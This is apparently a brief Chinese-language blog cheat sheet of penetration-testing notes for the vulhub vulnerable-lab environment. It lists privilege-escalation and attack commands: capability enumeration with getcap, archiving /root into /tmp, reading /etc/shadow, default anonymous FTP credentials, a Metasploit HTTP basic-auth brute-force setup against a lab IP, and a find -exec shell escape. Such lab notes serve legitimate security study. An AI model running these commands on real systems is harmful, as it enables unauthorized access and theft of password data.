---
title: vulhub
date: 2020-12-30 23:32:36
tags:
---

```
sbin/getcap -r / 2>/dev/null 查看有无进行cap的设置 查看忽略对读和搜索的限制，百度查看之
```

```
tar -zcvf /tmp/root.tar /root
```

```
stty raw -echo 是补全键和方向键恢复作用。
```

```
/etc/shadow 这个神器的文件 用户的密码信息
```

```
getcap -r / 2>/dev/null 这个和上面相容的 神器的文件处理，可以忽视对于读和搜索的限制
```

ftp匿名访问

```
账号ftp 密码ftp
```

基础认证的爆破

```
msfconsole
use /auxiliary/scanner/http/http_login
show options
set AUTH_URI /Secure/ 网站子目录
set STOP_ON_SUCCESS true
set PASS_FILE /root/Reconforce 密码字典
set PASS_FILE /root/Reconforce/pass
set rhosts 192.168.0.141
exploit
```

```
sudo -l 
groups
常用检测脚本3
```

```
find . -exec "/bin/bash"
```

